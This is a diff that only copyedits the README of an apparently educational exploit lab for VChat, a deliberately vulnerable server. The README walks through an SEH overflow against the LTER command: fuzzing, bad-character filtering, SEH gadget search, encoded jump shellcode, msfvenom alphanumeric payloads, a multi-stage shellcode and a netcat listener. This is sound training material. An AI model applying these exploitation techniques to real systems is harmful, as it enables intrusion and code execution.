@@ -1,19 +1,19 @@
 # VChat LTER Exploit: Character Restrictions
 
-*Notice*: The following exploit, and its procedures are based on the original [Blog](https://fluidattacks.com/blog/vulnserver-lter-seh/). When using Windows 10 the Manual encoding section required modification.
+*Notice*: The following exploit and its procedures are based on the original [Blog](https://fluidattacks.com/blog/vulnserver-lter-seh/). When using Windows 10 the Manual encoding section required modification.
 ___
 
-During this exploit we will use techniques to overcome character restrictions on the input we provide to the target application, these are known as "Bad Characters" when exploiting remote processes over a TCP or UDP connection. In this case our limitations are imposed not only by the fact our communications are interpreted as strings, and the characteristics of the functions used to handle them (*strncpy* and *strcpy*). But also by the way the `LTER` function manipulates the strings; in this way we need to make more explicit use of encoders to ensure our payload is preserved. Encoders are used to modify a given binary to be encoded as some other set of bytes that can be transformed back into their original state. A decoding function is them appended to the front of our transformed shellcode that will in some manner reconstruct the original binary that we originally used as input to the encoder. 
+During this exploit we will use techniques to overcome character restrictions on the input we provide to the target application, these are known as "Bad Characters" when exploiting remote processes over a TCP or UDP connection. In this case our limitations are imposed not only by the fact our communications are interpreted as strings, and the characteristics of the functions used to handle them (*strncpy* and *strcpy*). But also by the way the `LTER` function manipulates the strings; in this way we need to make more explicit use of encoders to ensure our payload is preserved. Encoders are used to modify a given binary to be encoded as some other set of bytes that can be transformed back into their original state. A decoding function is then appended to the front of our transformed shellcode that will, in some manner, reconstruct the original binary that we originally used as input to the encoder. 
 
-Unlike in previous exploits the main hurdle will not be space limitations on the stack, but the characters we are able to use in the exploit. At first glace this may not seem to be a big issue; However, as all of the assembly code is interpreted as machine code, each of which is represented as a character in our data this may limit not only the instructions available to us, but also the constant values we may use in the shell code.
+Unlike in previous exploits, the main hurdle will not be space limitations on the stack but the characters we are able to use in the exploit. At first glance, this may not seem to be a big issue; However, as all of the assembly code is interpreted as machine code, each of which is represented as a character in our data, this may limit not only the instructions available to us but also the constant values we may use in the shell code.
 
 **Note**: The final exploitation (Shellcode) is not working for unknown reasons at this time (Decoding is successful!). All other steps work as needed.
 
-**Notice**: Please setup the Windows and Linux systems as described in [SystemSetup](./SystemSetup/README.md)!
+**Notice**: Please set up the Windows and Linux systems as described in [SystemSetup](./SystemSetup/README.md)!
 ## Exploitation
 ### PreExploitation
 1. **Windows**: Setup Vchat.
-   1. Compile VChat and it's dependencies if they has not already been compiled. This is done with mingw. 
+   1. Compile VChat and its dependencies if they have not already been compiled. This is done with mingw. 
       1. Create the essfunc object File. 
 		```powershell
 		# Compile Essfunc Object file 
@@ -21,7 +21,7 @@ Unlike in previous exploits the main hurdle will not be space limitations on the
 		```
       2. Create the [DLL](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) containing functions that will be used by the VChat.   
 		```powershell
-		# Create a the DLL with a static (preferred) base address of 0x62500000
+		# Create a DLL with a static (preferred) base address of 0x62500000
 		$ gcc.exe -shared -o essfunc.dll -Wl,--out-implib=libessfunc.a -Wl,--image-base=0x62500000 essfunc.o
 		```
          * ```-shared -o essfunc.dll```: We create a DLL "essfunc.dll", these are equivalent to the [shared library](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) in Linux. 
@@ -43,8 +43,8 @@ Unlike in previous exploits the main hurdle will not be space limitations on the
 	# Replace the <IP> with the IP of the machine.
 	$ nmap -A <IP>
 	```
-   * We can think of the "-A" flag like the term aggressive as it does more than the normal scans, and is often easily detected.
-   * This scan will also attempt to determine the version of the applications, this means when it encounters a non-standard application such as *VChat* it can take 30 seconds to 1.5 minuets depending on the speed of the systems involved to finish scanning. You may find the scan ```nmap <IP>``` without any flags to be quicker!
+   * We can think of the "-A" flag as  the term aggressive as it does more than the normal scans, and is often easily detected.
+   * This scan will also attempt to determine the version of the applications, this means when it encounters a non-standard application such as *VChat* it can take 30 seconds to 1.5 minutes depending on the speed of the systems involved to finish scanning. You may find the scan ```nmap <IP>``` without any flags to be quicker!
    * Example results are shown below:
 
 		![NMap](Images/Nmap.png)
@@ -62,7 +62,7 @@ Unlike in previous exploits the main hurdle will not be space limitations on the
 
 		![Telnet](Images/Telnet.png)
 
-4. **Linux**: We can try a few inputs to the *LTER* command, and see if we can get any information. Simply type *LTER* followed by some additional input.<!-- as shown below -->
+4. **Linux**: We can try a few inputs to the *LTER* command and see if we can get any information. Simply type *LTER* followed by some additional input.<!-- as shown below -->
 
 	<!-- ![Telnet](Images/Telnet2.png) -->
 
@@ -78,11 +78,11 @@ The actions the *LTER* command takes on the given input are a bit different comp
 
 	<img src="Images/I1.png" width=800> 
 
-    * Note that you may need to launch it as the *Administrator* this is done by right clicking the icon found in the Windows search bar or on the desktop as shown below:
+    * Note that you may need to launch it as the *Administrator* this is done by right-clicking the icon found in the Windows search bar or on the desktop as shown below:
 			
 	<img src="Images/I1b.png" width = 200>
 
-2. Attach VChat: There are Two options! 
+2. Attach VChat: There are two options! 
    1. When the VChat is already Running. 
         1. Click File -> Attach
 
@@ -101,7 +101,7 @@ The actions the *LTER* command takes on the given input are a bit different comp
 
 			<img src="Images/I3-2.png" width=800>
 
-        3. Notice that a Terminal was opened when you clicked "Open" Now you should see the program output.
+        3. Notice that a Terminal was opened when you clicked "Open" now you should see the program output.
 
 			<img src="Images/I3-3.png" width=800>
 3. Ensure that the execution in not paused, click the red arrow (Top Left).
@@ -143,13 +143,13 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I4.png" width=600>
 
-	* Notice that VChat appears to have crashed after our third message. This is a message that is over 5000 characters long. So we can create a program like [exploit0.py](./SourceCode/exploit0.py) to send 5000 `A`s to repeatedly crash VChat.
+	* Notice that VChat appears to have crashed after our third message. This message is over 5000 characters long. So we can create a program like [exploit0.py](./SourceCode/exploit0.py) to send 5000 `A`s to repeatedly crash VChat.
 
-6. We can see at the bottom of *Immunity Debugger* that VChat crashed due to a memory access violation. This means we may have overwritten the return address stored on the stack, leading to the EIP being loaded with an invalid address or overwrote a SEH frame. This error could have also been caused if we overwrote a local pointer that is then dereferenced... However, we know from previous exploits on VChat this is unlikely.
+6. We can see at the bottom of *Immunity Debugger* that VChat crashed due to a memory access violation. This means we may have overwritten the return address stored on the stack, leading to the EIP being loaded with an invalid address or we overwrote a SEH frame. This error could have also been caused if we overwrote a local pointer that is then dereferenced... However, we know from previous exploits on VChat that this is unlikely.
 
 	<img src="Images/I4d.png" width=600>
 
-7. We can look at the comparison of the Register values before and after the fuzzing in Immunity Debugger, here we can see the EIP has **not been overwritten** with a series of `A`s (`0x41`). This means we likely overwrote the a SEH frame on the stack! 
+7. We can look at the comparison of the Register values before and after the fuzzing in Immunity Debugger. Here, we can see the EIP has **not been overwritten** with a series of `A`s (`0x41`). This means we likely overwrote the SEH frame on the stack! 
 	* Before 
 
 		<img src="Images/I7.png" width=600>
@@ -183,11 +183,11 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I9.png" width=600>
 
-3. Notice that the EIP register reads `75FB6819` and remains unchanged, but we can see in this case the SEH record's handler was overwritten with `396D4538`. We can use the [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) script to determine the address offset based on our search string's position in the pattern. 
+3. Notice that the EIP register reads `75FB6819` and remains unchanged, but we can see in this case, the SEH record's handler was overwritten with `396D4538`. We can use the [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) script to determine the address offset based on our search string's position in the pattern. 
 	```
 	$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 396D4538
 	```
-	* This will return an offset as shown below; In this case the offset is `3506`.
+	* This will return an offset as shown below; In this case, the offset is `3506`.
 
 	<img src="Images/I10.png" width=600> 
 
@@ -197,14 +197,14 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 		<img src="Images/I11.png" width=600> 
 
 		* See that the SEH handler is a series of the value `42` that is a series of Bs. This tells us that we can write an address to that location in order to change the control flow of the program when an exception occurs.
-		* Note: Sometimes it took a few runs for this to work and update on the Immunity debugger.
+		* Note: Sometimes, it took a few runs for this to work and update on the Immunity debugger.
 5. Now let's pass the exception to the program and see what happens and how this affects the stack, we used the keybind `Shift+F7` (This should be displayed at the bottom of the screen).
 
 	<img src="Images/I12.png" width=600>
 
     * We can see that the the `ESP` register (Containing the stack pointer) holds the address of `00EDEDC8`, however our buffer starts at `00EDEDD0`, which means we need to traverse 8 bytes before we reach a segment of the stack we control.
 
-6. We can use the fact that our extra data is on the stack, and `pop` the extra data off into some register. The exact register does not really matter as we simply want to remove it from the stack. We can use `mona.py` to find a SEH gadget that pops two elements off the stack (8-bytes), which places the stack pointer `ESP` in the correct position for us to start executing code we inject into our buffer; Use the command `!mona seh -cp nonull -cm safeseh=off -o` in Immunity Debugger as shown below.
+6. We can use the fact that our extra data is on the stack, and `pop` the extra data off into some register. The exact register does not really matter as we simply want to remove it from the stack. We can use `mona.py` to find a SEH gadget that pops two elements off the stack (8-bytes), which places the stack pointer `ESP` in the correct position for us to start executing code we inject into our buffer. Use the command `!mona seh -cp nonull -cm safeseh=off -o` in Immunity Debugger as shown below:
 
 	<img src="Images/I13.png" width=600>
 
@@ -216,17 +216,17 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 	<img src="Images/I14.png" width=600>
 
       * We can see there are quite a number of options, any one of them should work. For the examples we will be using the address `625016BF`. This address was chosen to exhibit the Bad Character behavior. 
-	  * *Note*: If you do not see any output it may be hidden behind the one of the Immunity Debugger windows.
+	  * *Note*: If you do not see any output, it may be hidden behind one of the Immunity Debugger windows.
 
 7. Modify the exploit to reflect the [exploit3.py](./SourceCode/exploit3.py) script to verify that this SEH overwrite works.
 
 	https://github.com/DaintyJet/VChat_LTER/assets/60448620/56abcbb0-42fc-433f-8730-5c55754df014
    
-   1. Click on the black button highlighted below, and enter in the address we decided in the previous step
+   1. Click on the black button highlighted below and enter the address we decided on earlier.
 
 		<img src="Images/I16.png" width=600>
 
-   2. Set a breakpoint at the desired address (Right click)
+   2. Set a breakpoint at the desired address (right-click)
 
 		<img src="Images/I17.png" width=600>
 
@@ -251,11 +251,11 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 2. As the range of possible ANSI values is limited 0 - 256 (`0x00` - `0xFF`) as they consist of 1 byte (8 bits) we can try sending all possible values to the *LTER* VChat command and see how it reacts. If we were handling Unicode characters, this becomes less feasible due to the number of possible inputs (Unicode characters are up to 4 bytes!). There are two methods for generating the set of values we will be sending to the VChat server.
 
-	1. Using [mona.py](https://github.com/corelan/mona) and Immunity Debugger we can with the command `!mona bytearray` generate all possible ANSI character values, however we may want to exclude known bad characters such as the null terminator (`0x00`), line feed (`0x0A`), and carriage return (`0x0D`). This can be done with the command `!mona bytearray -cpb '\x00\x0a\x0d'` as shown below:
+	1. Using [mona.py](https://github.com/corelan/mona) and Immunity Debugger, we can with the command `!mona bytearray` generate all possible ANSI character values, however, we may want to exclude known bad characters such as the null terminator (`0x00`), line feed (`0x0A`), and carriage return (`0x0D`). This can be done with the command `!mona bytearray -cpb '\x00\x0a\x0d'` as shown below:
 
 		<img src="Images/I19.png" width=600>
 
-		* For ease of access you can open a file `bytearray.txt` in the folder `C:\Users\Malware Analysis\AppData\Local\VirtualStore\Program Files (x86)\Immunity Inc\Immunity Debugger\bytearray.txt`. You can also use the command `!mona config -set workingfolder c:\logs\E6` to set the folder our output will be stored in so it is easier to locate.
+		* For ease of access, you can open a file `bytearray.txt` in the folder `C:\Users\Malware Analysis\AppData\Local\VirtualStore\Program Files (x86)\Immunity Inc\Immunity Debugger\bytearray.txt`. You can also use the command `!mona config -set workingfolder c:\logs\E6` to set the folder our output will be stored in so it is easier to locate.
 		* Code using this method is provided in [exploit4a.py](./SourceCode/exploit4a.py).
 	2. The second method is inline generation of characters in the exploit script. There are many ways you can do this generation but two examples are provided in [exploit4b.py](./SourceCode/exploit4b.py) and [exploit4c.py](./SourceCode/exploit4c.py) from the original blog which uses a python one-liner.
 
@@ -275,7 +275,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I22.png" width=600>
 
-6. `mona.py` again provides us a better way of viewing this information! We can use the following command: 
+6. `mona.py` again provides us with a better way of viewing this information! We can use the following command: 
 
 	```
 	!mona cmp -f C:\Users\Malware Analysis\AppData\Local\VirtualStore\Program Files (x86)\Immunity Inc\Immunity Debugger\bytearray.bin -a <memory address of array>
@@ -287,11 +287,11 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	https://github.com/DaintyJet/VChat_LTER/assets/60448620/0aa8ddb2-ec19-4a56-abec-80008a490a9c
 
-	1. Get the the array's starting address. The easiest way to do this is to read the address off the stack view pane. We can see from the memory dump (and stack ASCII dump) that our character array starts 2 bytes in from the stating address. 
+	1. Get the array's starting address. The easiest way to do this is to read the address off the stack view pane. We can see from the memory dump (and stack ASCII dump) that our character array starts 2 bytes in from the starting address. 
 
 		<img src="Images/I23.png" width=600>
 
-		* This means from the stack address `0107F21C` we can add 2 in order to get the starting address of `0107F21E` in this case.
+		* This means that in this case, from the stack address `0107F21C,` we can add 2 in order to get the starting address of `0107F21E`.
 
 	2. Run the `!mona cmp -f C:\Users\Malware Analysis\AppData\Local\VirtualStore\Program Files (x86)\Immunity Inc\Immunity Debugger\bytearray.bin -a <Address>` command!
 
@@ -358,7 +358,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 	* This means out valid characters are in the range `0x00` - `0x7F`. This is of course excluding the known bad characters that are the null terminator (`0x00`), line feed (`0x0A`), and carriage return (`0x0D`). 
 
 #### SEH Handler
-1. The first thing that we need to do, is fix the address we use to overwrite the SEH handler. We can again use `mona.py` to find *seh* gadgets, and filter out those that contain bad characters.
+1. The first thing that we need to do is fix the address we use to overwrite the SEH handler. We can again use `mona.py` to find *seh* gadgets and filter out those that contain bad characters.
 
 	```
 	!mona seh -cm safeseh=off -cp nonull,ascii -o -cpb '\x0a\x0d'
@@ -371,17 +371,17 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I25.png" width=600>
 
-	* In this case we have 17 pointers down from the previous 34.
+	* In this case, we have 17 pointers down from the previous 34.
 
 2. Modify your exploit code to reflect [exploit5.py](./SourceCode/exploit5.py) and run it against VChat to verify that this works. 
 
 	https://github.com/DaintyJet/VChat_LTER/assets/60448620/9445880b-f509-4e3c-9b2a-3329cf40f6bd
    
-   1. Click on the black button highlighted below, enter in the address we decided in the previous step.
+   1. Click on the black button highlighted below and enter the address we decided on previously.
 
 		<img src="Images/I16.png" width=600>
 
-   2. Set a breakpoint at the desired address (Right click), in this case I chose `0x6250184E`.
+   2. Set a breakpoint at the desired address (right-click), in this case I chose `0x6250184E`.
 
 		<img src="Images/I26.png" width=600>
 
@@ -440,11 +440,11 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 	* `-e <Encoder>`: Specify the encoder to use, we can list all possible encoders with `msfvenom -l encoders`.
 	* `-o /dev/null`: Specify the output file, since we just want to see the size of the resulting shellcode we do not want to save it (Write to /dev/null).
 
-	1. Try [`x86/add_sub`](https://www.infosecmatter.com/metasploit-module-library/?mm=encoder/x86/add_sub) encoder on the long jump `jmp_l.bin`. This performs a series of additions and subtractions to encode the shellcode for transmission, and recover the original instructions in memory at runtime. 
+	1. Try [`x86/add_sub`](https://www.infosecmatter.com/metasploit-module-library/?mm=encoder/x86/add_sub) encoder on the long jump `jmp_l.bin`. This performs a series of additions and subtractions to encode the shellcode for transmission and recover the original instructions in memory at runtime. 
 		```
 		cat jmp_l.bin | msfvenom -p - -a x86 --platform windows -e x86/add_sub -o /dev/null
 		```
-		* This results in the following output, notice that it fails! We have a 5 byte instruction, which is not divisible by 4! 
+		* This results in the following output, notice that it fails! We have a 5-byte instruction, which is not divisible by 4! 
 		```
 		┌──(kali㉿kali)-[~]
 		└─$ cat jmp_l.bin | msfvenom -p - -a x86 --platform windows -e x86/add_sub -o /dev/null 
@@ -567,7 +567,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 		ADD AX,0x097F
 		ADD AX,0x0a54
 		```
-		4. We can generate this assembly by right clicking the instruction view window at the location we would like to modify the program and selecting assemble. 
+		4. We can generate this assembly by right-clicking the instruction view window at the location we would like to modify the program and selecting assemble. 
 
 			<img src="Images/I33.png" width=600>
 
@@ -585,7 +585,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 			<img src="Images/I16.png" width=600>
 
-		2. Set a breakpoint at the desired address (Right click), in this case I chose `0x6250184E`.
+		2. Set a breakpoint at the desired address (right-click), in this case I chose `0x6250184E`.
 
 			<img src="Images/I26.png" width=600>
 
@@ -647,11 +647,11 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 			https://github.com/DaintyJet/VChat_LTER/assets/60448620/e49eb041-2a0c-42b8-9346-4e9718ff7dae
 
-			1. Click on the black button highlighted below, and enter in the address we decided in the previous step.
+			1. Click on the black button highlighted below, and enter in the address we decided earlier.
 
 				<img src="Images/I16.png" width=600>
 
-			2. Set a breakpoint at the desired address (Right click), in this case I chose `0x6250184E`.
+			2. Set a breakpoint at the desired address (right-click), in this case I chose `0x6250184E`.
 
 				<img src="Images/I26.png" width=600>
 
@@ -680,13 +680,13 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 			```
 			PUSH EAX
 			```
-		4. Now using Immunity Debugger we can generate the assembly instructions we need to embed in our shellcode!
+		4. Now, using Immunity Debugger, we can generate the assembly instructions we need to embed in our shellcode!
 
 			1. We can generate assembly by right clicking the instruction view window at the location we would like to modify the program and selecting assemble. 
 
 				<img src="Images/I39.png" width=600>
 
-			2. We then enter in the instruction we would like to assemble. 
+			2. We then enter the instructions we would like to assemble. 
 
 				<img src="Images/I40.png" width=600>
 
@@ -719,7 +719,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 		<img src="Images/I44.png" width=600>
 
-	2. The encoder that we generate may perform operations on the stack so we want to make sure this will not corrupt our shell code and if we generate an instruction to later place it on the stack using a `PUSH EAX` instruction we need to make sure the location we will write this to is accessible to our currently executing shell code. So we can simply realign the `ESP` value similar to how we did this in [exploit7b.py](./SourceCode/exploit7b.py). We modify it so the ESP is subtracted from, putting it in a better position which is unlikely to conflict with the currently executing shell code. This is because the stack will continue to grow down, while the shellcode is located **above** the new `ESP` value. 
+	2. The encoder that we generate may perform operations on the stack so we want to make sure this will not corrupt our shell code and if we generate an instruction to later place it on the stack using a `PUSH EAX` instruction we need to make sure the location we will write this to is accessible to our currently executing shell code. So we can simply realign the `ESP` value similar to how we did this in [exploit7b.py](./SourceCode/exploit7b.py). We modify it so the ESP is subtracted from, putting it in a better position that is unlikely to conflict with the currently executing shell code. This is because the stack will continue to grow down, while the shellcode is located **above** the new `ESP` value. 
 
 	```
 	PUSH ESP  		   ; Push the ESP register's value onto the stack 
@@ -786,7 +786,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 		* `-m`: Generates shellcode in the format expected by python `\x00 - \xff`.
 		* `-p`: Pad shellcode so it is a multiple of 4.
 		* `-s <Shellcode>`: Shellcode to encode as we added the `-p` flag this can be of any length.
-		* `-v`: Name of variable for output.
+		* `-v`: Name of the variable for output.
 	6. Add the Encoded Long Jump shellcode to the exploit as shown in [exploit11.py](./SourceCode/exploit11.py), and test it!
 
 		https://github.com/DaintyJet/VChat_LTER/assets/60448620/47b5df9a-6c07-4cd0-9314-42cb6e135360
@@ -803,12 +803,12 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 			<img src="Images/I47.png" width=600>
 
-Now that we have all the necessary parts for the creation of a exploit.
+Now that we have all the necessary parts for the creation of an exploit.
 ### Exploitation
-There are number of possible ways we can exploit VChat with `LTER` now that we have jumped to the start of the buffer we control. The original [Blog](https://fluidattacks.com/blog/vulnserver-lter-seh/) injects the custom shellcode used in [KSTET_Multi](https://github.com/DaintyJet/VChat_KSTET_Multi). This is discussed in the section [Multi-Stage](#multi-stage); However, this does not appear to work reliably in the VChat server with the `LTER` exploit. So we also modified the exploit code to inject a [Encoded-MSF-Exploit](#encoded-msf-exploit), this should be the preferred method when exploiting VChat.
+There are a number of possible ways we can exploit VChat with `LTER` now that we have jumped to the start of the buffer we control. The original [Blog](https://fluidattacks.com/blog/vulnserver-lter-seh/) injects the custom shellcode used in [KSTET_Multi](https://github.com/DaintyJet/VChat_KSTET_Multi). This is discussed in the section [Multi-Stage](#multi-stage); However, this does not appear to work reliably in the VChat server with the `LTER` exploit. So we also modified the exploit code to inject a [Encoded-MSF-Exploit](#encoded-msf-exploit), this should be the preferred method when exploiting VChat.
 
 #### Encoded-MSF-Exploit
-With this exploit we will use the well known [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) tool to generate an encoded payload within the previously discussed constraints. 
+With this exploit, we will use the well-known [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) tool to generate an encoded payload within the previously discussed constraints. 
 
 1. As we have done before we need to realign the stack pointer stored in the `ESP` register. This is because the encoder we will use later will need to know where in memory it is located. This option requires a register pointing to the start of our encoded shellcode, we do this as without this option enabled the exploit contains non-alphanumeric characters.    
 
@@ -918,7 +918,7 @@ With this exploit we will use the well known [msfvenom](https://docs.metasploit.
 
 		<img src="Images/I55.png" width=600>
 
-		* We can see this is quite a large exploit! Luckily we have the space in our buffer for this even with the pre-existing jumps!
+		* We can see this is quite a large exploit! Luckily, we have the space in our buffer for this, even with the pre-existing jumps!
 	3. If you would like to try other encoders and see their options you will firs need to look at them within the [msfconsole](https://docs.rapid7.com/metasploit/msf-overview/).
 
 		1. Open the [msfconsole](https://docs.rapid7.com/metasploit/msf-overview/).
@@ -944,11 +944,11 @@ With this exploit we will use the well known [msfvenom](https://docs.metasploit.
 	https://github.com/DaintyJet/VChat_LTER/assets/60448620/d6b916f2-cc82-47fb-aabd-e5119b1c7a69
 
 
-	1. Click on the black button highlighted below, and enter in the address we decided in the previous step.
+	1. Click on the black button highlighted below, and enter in the address we decided earlier.
 
 		<img src="Images/I16.png" width=600>
 
-	2. Set a breakpoint at the desired address (Right click), in this case I chose `0x6250184E`.
+	2. Set a breakpoint at the desired address (right-click), in this case I chose `0x6250184E`.
 
 		<img src="Images/I26.png" width=600>
 
@@ -967,7 +967,7 @@ With this exploit we will use the well known [msfvenom](https://docs.metasploit.
 	* `p`: Set to listen on a port, in this case port 8080.
 
 <!-- https://zflemingg1.gitbook.io/undergrad-tutorials/walkthroughs-osce/vulnserver-lter-command -->
-#### Multi Stage
+#### Multi-Stage
 We will perform a similar exploit to one done for the [KSTET_Multi](https://github.com/DaintyJet/VChat_KSTET_Multi) exploit, as we will first inject an encoded shellcode to receive the second stage shellcode that is not encoded (It does not account for the restrictive character set), writing it to the stack, and then entering the newly written second stage. This is done so we only have to create the smaller first stage in compliance with the allowed character set. We do this since it is much easier to create the smaller first stage within the restricted character set than it is for us to generate the more complicated metasploit payloads in a format that preserves their functionality. By instead using the first stage to receive the more complicated shellcode and directly write it to the stack we do not need to be worried about how the original programs' logic changes the data we send, as we have bypassed it with the first stage.
 
 1. As we have done before we need to realign the stack pointer stored in the `ESP` register, since we have jumped to the start of the buffer there are a few thousand `A`s between us and the top of the stack. Additionally if we do not move the stack pointer as the last instruction used by the decoder in the shellcode is `PUSH EAX`, the second stage shellcode is written to the stack following the `JMP <Head>` instruction so we would never reach it!  
@@ -1086,13 +1086,13 @@ We will perform a similar exploit to one done for the [KSTET_Multi](https://gith
 		* `-m`: Generates shellcode in the format expected by python `\x00 - \xff`.
 		* `-p`: Pad shellcode so it is a multiple of 4.
 		* `-s <Shellcode>`: Shellcode to encode as we added the `-p` flag this can be of any length. 
-		* `-v`: Name of variable for output. 
+		* `-v`: Name of the variable for output. 
 	
 	5. Modify your exploit to reflect [exploit12b-MULT.py](./SourceCode/exploit12b-MULT.py), then test it!
 
 		https://github.com/DaintyJet/VChat_LTER/assets/60448620/ed4fc693-7510-409b-beb0-83b3c6123ed4
 
-		1. Click on the black button highlighted below, and enter in the address we decided in the previous step.
+		1. Click on the black button highlighted below, and enter the address we decided in the previous step.
 
 			<img src="Images/I16.png" width=600>
 
@@ -1183,7 +1183,7 @@ The manual encoding section described in the original [Blog](https://fluidattack
 4. Push EAX to the stack (PUSH EAX)
 5. Pop the EAX value to ESP (POP ESP)
 
-The assembly code in the original blog (shown as below) does not contain any bad character, and can therefore be used directly.
+The assembly code in the original blog (shown below) does not contain any bad characters and can, therefore, be used directly.
 ```
 # Align stack pointer
     b'\x54' +               # PUSH ESP
@@ -1193,7 +1193,7 @@ The assembly code in the original blog (shown as below) does not contain any bad
     b'\x5c' +               # POP ESP
 ```
 ---
-However in my case, the offset from the current ESP to the end of the C buffer is 0x13D3. So I use the same way to make ESP point to the buffer end and generate the following code: 
+However, in my case, the offset from the current ESP to the end of the C buffer is 0x13D3. So I use the same way to make ESP point to the buffer end and generate the following code: 
 ```
 # Align stack pointer
     b'\x54' +               # PUSH ESP
